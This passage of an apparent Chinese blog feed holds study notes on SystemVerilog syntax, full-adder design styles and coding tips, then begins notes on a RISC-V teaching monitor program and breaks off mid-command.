class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 SystemVerilog 中也提供了 <code>case</code> 这样的条件判断语句, 避免使用过多的 if-else 进行编写.</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">case</span> <span class="token punctuation">(</span>敏感表达式<span class="token punctuation">)</span>    条件判断<span class="token number">1</span><span class="token punctuation">:</span> 语句<span class="token number">1</span><span class="token punctuation">;</span>     条件判断<span class="token number">2</span><span class="token punctuation">:</span> 语句<span class="token number">2</span><span class="token punctuation">;</span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    条件判断n<span class="token punctuation">:</span> 语句n<span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token punctuation">:</span> 语句n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">endcase</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里语句不需要插入 <code>break</code>, 在语句执行完成后, 直接跳出了 case 语句本身, 这样的行为模式对于程序员来说更加友好. </p><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><p>SystemVerilog 中也存在循环语句. 可综合的循环语句为 <code>for</code> 语句. 循环语句不容易直观想象得出综合之后的效果, 描述的功能更加高层和抽象, 转化为硬件的难度会更大. 其它三个循环语句分别为 <code>forever</code> 语句, <code>repeat</code> 语句, <code>while</code> 语句. 其中 <code>forever</code> 语句会连续执行语句, 主要在仿真中使用, 生成周期性的波形 (时钟信号). </p><p><code>repeat</code> 语句: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token function">repeat</span><span class="token punctuation">(</span>循环次数的表达式<span class="token punctuation">)</span><span class="token keyword">begin</span>    语句或者语句块<span class="token keyword">end</span> <span class="token comment">// 单个语句不需要 begin 和 end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>while</code> 语句: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token function">while</span><span class="token punctuation">(</span>循环执行的条件表达式<span class="token punctuation">)</span><span class="token keyword">begin</span>    语句或者语句块<span class="token keyword">end</span> <span class="token comment">// 单个语句不需要 begin 和 end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>repeat</code> 和 <code>while</code> 往往不可综合, 编写代码时尽量使用 <code>for</code> 语句来实现循环.</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> for_adder <span class="token punctuation">(</span>    <span class="token keyword">input</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> a<span class="token punctuation">,</span>    <span class="token keyword">input</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> b<span class="token punctuation">,</span>    <span class="token keyword">input</span> cin<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> sum<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token keyword">reg</span> cout<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">reg</span> c<span class="token punctuation">;</span>    <span class="token keyword">integer</span> i<span class="token punctuation">;</span>    <span class="token important">always_comb</span> <span class="token keyword">begin</span>        c <span class="token operator">=</span> cin<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>            <span class="token operator">{</span>c<span class="token punctuation">,</span>sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">}</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> c<span class="token punctuation">;</span>        <span class="token keyword">end</span>        cout <span class="token operator">=</span> c<span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是一个功能描述的代码, 描述层次比较抽象, 不是功能设计的代码. </p><h2 id="SystemVerilog-的设计层次与风格"><a href="#SystemVerilog-的设计层次与风格" class="headerlink" title="SystemVerilog 的设计层次与风格"></a>SystemVerilog 的设计层次与风格</h2><p>SystemVerilog 的语言有很大的灵活性, 对于相同的电路可以有不同的设计方法. 一个 1 位全加器的输入包括 1 位的低位进位 <code>cin</code>, 两个 1 位的输入信号 <code>a</code> 和 <code>b</code>, 输出则包括了一个当前位的和 <code>sum</code> 以及向高位的进位 <code>cout</code>. 从 1 位全加器的真值表可以获得逻辑表达式 (这里只使用与或非门的表达): </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CarryOut</span><span class="token operator">=</span><span class="token punctuation">(</span>¬A*B*CarryIn<span class="token punctuation">)</span>+<span class="token punctuation">(</span>A*¬B*CarryIn<span class="token punctuation">)</span>+<span class="token punctuation">(</span>A*B*¬CarryIn<span class="token punctuation">)</span>+<span class="token punctuation">(</span>A*B*CarryIn<span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span>B*CarryIn<span class="token punctuation">)</span>+<span class="token punctuation">(</span>A*CarryIn<span class="token punctuation">)</span>+<span class="token punctuation">(</span>A*B<span class="token punctuation">)</span><span class="token assign-left variable">Sum</span><span class="token operator">=</span><span class="token punctuation">(</span>¬A*¬B*CarryIn<span class="token punctuation">)</span>+<span class="token punctuation">(</span>¬A*B*¬CarryIn<span class="token punctuation">)</span>+<span class="token punctuation">(</span>A*¬B*¬CarryIn<span class="token punctuation">)</span>+<span class="token punctuation">(</span>A*B*CarryIn<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>很容易获得 1 位全加器的电路表达形式: </p><p><img src="/pic/192.png" alt=""></p><p>在上述的电路中, 使用了三个非门 <code>not</code>, 四个 3 输入的与门 <code>and</code>, 三个 2 输入的与门 <code>and</code>, 一个 4 输入的或门 <code>or</code>, 一个 3 输入的或门 <code>or</code>. 这里的非门, 与门和或门都是 SystemVerilog 中内置的门电路, 可以直接构造出 SystemVerilog 的结构描述. </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> full_adder1 <span class="token punctuation">(</span>    <span class="token keyword">input</span> a<span class="token punctuation">,</span>    <span class="token keyword">input</span> b<span class="token punctuation">,</span>    <span class="token keyword">input</span> cin<span class="token punctuation">,</span>    <span class="token keyword">output</span> sum<span class="token punctuation">,</span>    <span class="token keyword">output</span> cout<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">wire</span> a_n<span class="token punctuation">,</span> b_n<span class="token punctuation">,</span> cin_n<span class="token punctuation">,</span> sum_p1<span class="token punctuation">,</span>sum_p2<span class="token punctuation">,</span>sum_p3<span class="token punctuation">,</span>sum_p4<span class="token punctuation">,</span> cout_p1<span class="token punctuation">,</span> cout_p2<span class="token punctuation">,</span> cout_p3<span class="token punctuation">;</span>    <span class="token function">not</span><span class="token punctuation">(</span>a_n<span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>b_n<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>cin_n<span class="token punctuation">,</span>cin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">and</span><span class="token punctuation">(</span>sum_p1<span class="token punctuation">,</span>a_n<span class="token punctuation">,</span>b_n<span class="token punctuation">,</span>cin<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>sum_p2<span class="token punctuation">,</span>a_n<span class="token punctuation">,</span>b<span class="token punctuation">,</span>cin_n<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>sum_p3<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b_n<span class="token punctuation">,</span>cin_n<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>sum_p4<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>cin<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>cout_p1<span class="token punctuation">,</span>b<span class="token punctuation">,</span>cin<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>cout_p2<span class="token punctuation">,</span>a<span class="token punctuation">,</span>cin<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>cout_p3<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">or</span><span class="token punctuation">(</span>sum<span class="token punctuation">,</span>sum_p1<span class="token punctuation">,</span>sum_p2<span class="token punctuation">,</span>sum_p3<span class="token punctuation">,</span>sum_p4<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>cout<span class="token punctuation">,</span>cout_p1<span class="token punctuation">,</span>cout_p2<span class="token punctuation">,</span>cout_p3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>门级结构描述虽然不是最底层的描述 (晶体管搭建), 但是已经非常接近, 可以使用元件进行直接映射. 这种方法一般用于设计比较简单或者高效的工作电路, 方便综合器直接进行综合.</p><p>门级结构描述虽然方便了底层的综合器, 但是对于编程来说不方便, 希望能够进行更加高层的设计, 一个选择是将上述的逻辑表达式写到程序里, 这是数据流描述方法. </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> full_adder1 <span class="token punctuation">(</span>    <span class="token keyword">input</span> a<span class="token punctuation">,</span>    <span class="token keyword">input</span> b<span class="token punctuation">,</span>    <span class="token keyword">input</span> cin<span class="token punctuation">,</span>    <span class="token keyword">output</span> sum<span class="token punctuation">,</span>    <span class="token keyword">output</span> cout<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">assign</span> sum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">~</span>a<span class="token operator">&amp;~</span>b<span class="token operator">&amp;</span>cin<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token operator">~</span>a<span class="token operator">&amp;</span>b<span class="token operator">&amp;~</span>cin<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>a<span class="token operator">&amp;~</span>b<span class="token operator">&amp;~</span>cin<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>a<span class="token operator">&amp;</span>b<span class="token operator">&amp;</span>cin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">assign</span> cout <span class="token operator">=</span> <span class="token punctuation">(</span>b<span class="token operator">&amp;</span>cin<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>a<span class="token operator">&amp;</span>cin<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>a<span class="token operator">&amp;</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数据流描述方法描述了组合逻辑中, 输出是如何随着输入数据的变化而变化, 使用持续赋值语句 <code>assign</code>. 但是, 数据流描述的抽象层次还不是很高, 对于复杂的硬件逻辑设计来说, 使用行为级描述, 即直接描述出硬件所需要完成的功能更为妥当. </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> full_adder1 <span class="token punctuation">(</span>    <span class="token keyword">input</span> a<span class="token punctuation">,</span>    <span class="token keyword">input</span> b<span class="token punctuation">,</span>    <span class="token keyword">input</span> cin<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token keyword">reg</span> sum<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token keyword">reg</span> cout<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token important">always_comb</span> <span class="token keyword">begin</span>        <span class="token operator">{</span>cout<span class="token punctuation">,</span>sum<span class="token operator">}=</span>a<span class="token operator">+</span>b<span class="token operator">+</span>cin<span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从行为级描述中看不到电路怎样使用元件以及怎样布线, 但是完整描述了一个全加器所需要完成的功能. </p><p>在设计更加大型的硬件电路的时候, 使用结构级描述是必不可少的. 可以设计一些小型电路模块, 通过结构描述设计出规模更大的电路. 通过设计 4 位的加法器来说明: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> full_adder4 <span class="token punctuation">(</span>    <span class="token keyword">input</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> a<span class="token punctuation">,</span>    <span class="token keyword">input</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> b<span class="token punctuation">,</span>    <span class="token keyword">input</span> cin<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> sum<span class="token punctuation">,</span>    <span class="token keyword">output</span> cout<span class="token punctuation">)</span><span class="token punctuation">;</span>    full_adder1 <span class="token function">a0</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cin<span class="token punctuation">,</span>sum<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cin1<span class="token punctuation">)</span><span class="token punctuation">;</span>    full_adder1 <span class="token function">a1</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cin1sum<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cin2<span class="token punctuation">)</span><span class="token punctuation">;</span>    full_adder1 <span class="token function">a2</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cin2sum<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cin3<span class="token punctuation">)</span><span class="token punctuation">;</span>    full_adder1 <span class="token function">a3</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cin3sum<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cout<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在实际进行硬件设计的时候, 出发点还是自顶向下, 对硬件总体先分成多个互相独立的模块, 然后定义之间的连线关系, 连线关系即是它们之间的接口, 最终完成的硬件通过结构描述方式将模块连接在一起. </p><h2 id="一些编程建议与经验"><a href="#一些编程建议与经验" class="headerlink" title="一些编程建议与经验"></a>一些编程建议与经验</h2><h3 id="default-nettype-none"><a href="#default-nettype-none" class="headerlink" title="`default_nettype none"></a><code>`default_nettype none</code></h3><p>SystemVerilog 中没有被定义的标记 label 都被默认为是 <code>wire</code> 类型的, 建议的做法是 <code>`default_nettype none</code>. 这可以防止在信号名字上出现的拼写错误. </p><h3 id="锁相环电路"><a href="#锁相环电路" class="headerlink" title="锁相环电路"></a>锁相环电路</h3><p>PLL 是 FPGA 上专用的时钟生成模块, 内部是模拟电路. PLL 在启动时需要一段时间才能进入稳定状态, <code>locked</code> 信号输出表示稳定. 在锁相环电路稳定输出之后, <code>locked</code> 信号会被置位, 此时可以进行电路寄存器初始化. </p><h3 id="调时序"><a href="#调时序" class="headerlink" title="调时序"></a>调时序</h3><p>硬件编程是仿真驱动的, 比较难的部分是调时序, 使各个部分的时序相互匹配, 同时满足对于外设的时间要求. 不同模块之间由于寄存器的关系有相位差, 需要增加几个空的状态机节拍, 匹配不同路径的信号传播. </p><h3 id="阻塞赋值语句和非阻塞赋值语句"><a href="#阻塞赋值语句和非阻塞赋值语句" class="headerlink" title="阻塞赋值语句和非阻塞赋值语句"></a>阻塞赋值语句和非阻塞赋值语句</h3><p>一般来说, 组合逻辑用 <code>=</code>, 时序逻辑用 <code>&lt;=</code>. <code>wire</code> 和 <code>reg</code> 是语法层面的内容, <code>assign</code> 的左值必须是 <code>wire</code>, <code>always</code> 里的左值必须是 <code>reg</code>, 否则综合会报错. 是否综合成触发器, 根据有没有时钟信号决定. 综合器通过 <code>posedge</code> 的描述方法知道对应的模块里面需要响应 <code>posedge</code> 或是 <code>negedge</code>, 从而综合出触发器. 尽量使用 <code>logic</code> 类型并匹配 <code>always_comb</code> 和 <code>always_ff</code> 来分别描述组合逻辑和时序逻辑.</p><h3 id="程序的可读性"><a href="#程序的可读性" class="headerlink" title="程序的可读性"></a>程序的可读性</h3><p>增加程序的可维护性, 在选择信号名称的时候需要按照名称选择的惯例, 有一些命名方法是常用的.</p><ul><li><code>_i</code>, <code>_o</code>, 分别代表一个模块的输入信号和输出信号. </li><li><code>n</code> 或者 <code>_n</code> 为后缀, 表明这个信号是 0 使能, 0 表示有效. </li><li><code>clk</code>, <code>clock</code> 时钟信号, 后面或者前面接上频率, 可以显示时钟信号的频率. </li><li><code>rst</code>, <code>reset</code> 复位信号, 使得信号可以重置, 一般在重置响应中写入状态机的初值. </li><li><code>we</code>, <code>write enable</code> 信号, 对应于模块的写入使能. </li><li><code>oe</code>, <code>output enable</code> 信号, 对应于模块的输出使能. </li><li><code>ce</code>, <code>chip enable</code>, 对应于模块的总体使能信号. 上述的信号几乎在所有的模块中都会有 (注意信号是正向的还是反向的, 即 1 使能还是 0 使能. 0 使能会在信号名称的上面带有横线).</li><li><code>select</code>, <code>sel</code> 信号, 一般用于对芯片的选择. </li></ul><h3 id="代码检查工具"><a href="#代码检查工具" class="headerlink" title="代码检查工具"></a>代码检查工具</h3><p><a href="https://www.veripool.org/">这个网址</a>中有一些 SystemVerilog 的工具可供参考. 使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">verilator --lint-only <span class="token parameter variable">-Wall</span> <span class="token punctuation">[</span>source_files.v<span class="token punctuation">]</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以帮助做一些检查. </p><h3 id="一些特殊的语法点"><a href="#一些特殊的语法点" class="headerlink" title="一些特殊的语法点"></a>一些特殊的语法点</h3><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog">ram_address <span class="token operator">=</span> pc<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">+</span><span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从第 2 位开始的 21 位, 把最后两位去掉. 也可以写成 <code>pc[22-:21]</code> 或 <code>pc[22:2]</code>. </p><h3 id="case-语句可能出现错误的情况"><a href="#case-语句可能出现错误的情况" class="headerlink" title="case 语句可能出现错误的情况:"></a>case 语句可能出现错误的情况:</h3><p>使用 <code>case</code> 的时候把所有信号在所有情况下写全, 或者灵活使用阻塞赋值语句 <code>=</code>, 在过程最前面的时候先进行赋值. </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token important">always_comb</span> <span class="token keyword">begin</span>    ram_we_n <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>    ram_oe_n <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>    ram_address <span class="token operator">=</span> <span class="token number">21'h0</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token punctuation">(</span>state<span class="token punctuation">)</span>        STATE_FETCH<span class="token punctuation">:</span> <span class="token keyword">begin</span>            ram_oe_n <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>            ram_address <span class="token operator">=</span> pc<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        STATE_MEM<span class="token punctuation">:</span> <span class="token keyword">begin</span>            ram_oe_n <span class="token operator">=</span> mem_op_write<span class="token punctuation">;</span>            ram_we_n <span class="token operator">=</span> <span class="token operator">~</span>mem_op_write<span class="token punctuation">;</span>            ram_address <span class="token operator">=</span> ex_val_o<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">end</span>    <span class="token keyword">endcase</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面的 case 语句代码块也是正确的: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token important">always_comb</span> <span class="token keyword">begin</span>    <span class="token keyword">case</span> <span class="token punctuation">(</span>state<span class="token punctuation">)</span>        STATE_FETCH<span class="token punctuation">:</span> <span class="token keyword">begin</span>            ram_oe_n <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>            ram_we_n <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>            ram_address <span class="token operator">=</span> pc<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        STATE_MEM<span class="token punctuation">:</span> <span class="token keyword">begin</span>            ram_oe_n <span class="token operator">=</span> mem_op_write<span class="token punctuation">;</span>            ram_we_n <span class="token operator">=</span> <span class="token operator">~</span>mem_op_write<span class="token punctuation">;</span>            ram_address <span class="token operator">=</span> ex_val_o<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">end</span>        <span class="token keyword">default</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>            ram_oe_n <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>            ram_we_n <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>            ram_address <span class="token operator">=</span> <span class="token number">21'h0</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>    <span class="token keyword">endcase</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是下面的 case 语句代码块是错误的.</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token important">always_comb</span> <span class="token keyword">begin</span>    <span class="token keyword">case</span> <span class="token punctuation">(</span>state<span class="token punctuation">)</span>        STATE_FETCH<span class="token punctuation">:</span> <span class="token keyword">begin</span>            ram_oe_n <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>            ram_address <span class="token operator">=</span> pc<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        STATE_MEM<span class="token punctuation">:</span> <span class="token keyword">begin</span>            ram_oe_n <span class="token operator">=</span> mem_op_write<span class="token punctuation">;</span>            ram_we_n <span class="token operator">=</span> <span class="token operator">~</span>mem_op_write<span class="token punctuation">;</span>            ram_address <span class="token operator">=</span> ex_val_o<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">end</span>        <span class="token keyword">default</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>            ram_oe_n <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>            ram_we_n <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>            ram_address <span class="token operator">=</span> <span class="token number">21'h0</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>    <span class="token keyword">endcase</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Warning-empty-statement-in-sequential-block"><a href="#Warning-empty-statement-in-sequential-block" class="headerlink" title="Warning: empty statement in sequential block"></a>Warning: empty statement in sequential block</h3><p>两个分号放在一起 <code>;;</code> 就会出现这个警告. 一个容易出现的错误是在信号常数定义 <code>`define</code> 的时候, 在信号后面跟了一个分号, 在模块代码里面直接使用的时候就会出现上面的情况. </p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> COD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> COD </tag>
            
            <tag> SV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理 笔记2</title>
      <link href="/2023/09/23/risc-v-jian-kong-cheng-xu/"/>
      <url>/2023/09/23/risc-v-jian-kong-cheng-xu/</url>
      
        <content type="html"><![CDATA[<h1 id="RISC-V-监控程序"><a href="#RISC-V-监控程序" class="headerlink" title="RISC-V 监控程序"></a>RISC-V 监控程序</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>Thinpad</strong> 教学计算机搭配了监控程序, 能够接受用户命令, 支持输入汇编指令并运行, 查看寄存器及内存状态. 监控程序可在实现的 32/64 位 <strong>RISC-V</strong> CPU 上运行, 一方面帮助理解、掌握 RISC-V 指令系统及其软件开发, 另一方面作为验证 CPU 功能正确性的标准. </p><p>监控程序分为 <strong>Kernel</strong> 和 <strong>Term</strong> 两个部分. 其中 Kernel 使用 RISC-V 汇编语言编写, 运行在 Thinpad 上学生实现的 <strong>CPU</strong> 中, 用于<strong>管理硬件资源</strong>; Term 是上位机程序, 使用 Python 语言编写, 有基于命令行的用户界面, 达到与<strong>用户交互</strong>的目的. Kernel 和 Term 直接通过串口通信, 即用户在 Term 界面中输入的命令、代码经过 Term 处理后, 通过串口传输给 Kernel 程序; 反过来, Kernel 输出的信息也会通过串口传输到 Term 并展示给用户. </p><h2 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h2><p>Kernel 使用汇编语言编写, 使用到的指令有 20 余条, 均符合 RISC-V 规范. Kernel 提供了三种不同的版本, 以适应不同的档次的 CPU 实现: 第一档为<strong>基础版本</strong>, 直接基本的 I/O 和命令执行功能, 不依赖异常、中断、csr 等处理器特征, 适合于最简单的 CPU 实现; 第二档<strong>支持中断</strong>, 使用中断方式完成串口的 I/O 功能, 需要处理器实现中断处理机制, 及相关的 csr 寄存器; 第三档进一步增加了<strong>页表的应用</strong>, 要求处理器支持基于 Sv32 或者 Sv39 的内存映射, 更加接近于操作系统对处理器的需求. </p><p>为了在硬件上运行 Kernel 程序, 我们首先要对 Kernel 的汇编代码进行编译. 在 <code>kernel</code> 文件夹下面, 有汇编代码和 Makefile 文件, 我们可以使用 make 工具编译 Kernel 程序. 假设当前目录为 <code>kernel</code> , 目标版本为基础版本, 在终端中运行命令:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可开始编译流程. 如果顺利结束, 将生成 <code>kernel.elf</code> 和 <code>kernel.bin</code> 文件, 即可执行文件. 要在模拟器中运行它, 可以使用命令:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> sim<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>它会在 <strong>QEMU</strong> 中启动监控程序, 并等待 Term 程序连接. 本文后续章节介绍了如何使用 Term 连接模拟器. 需要注意的是, 如果需要打开一些开关, 需要在每条命令中传递参数, 比如:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span 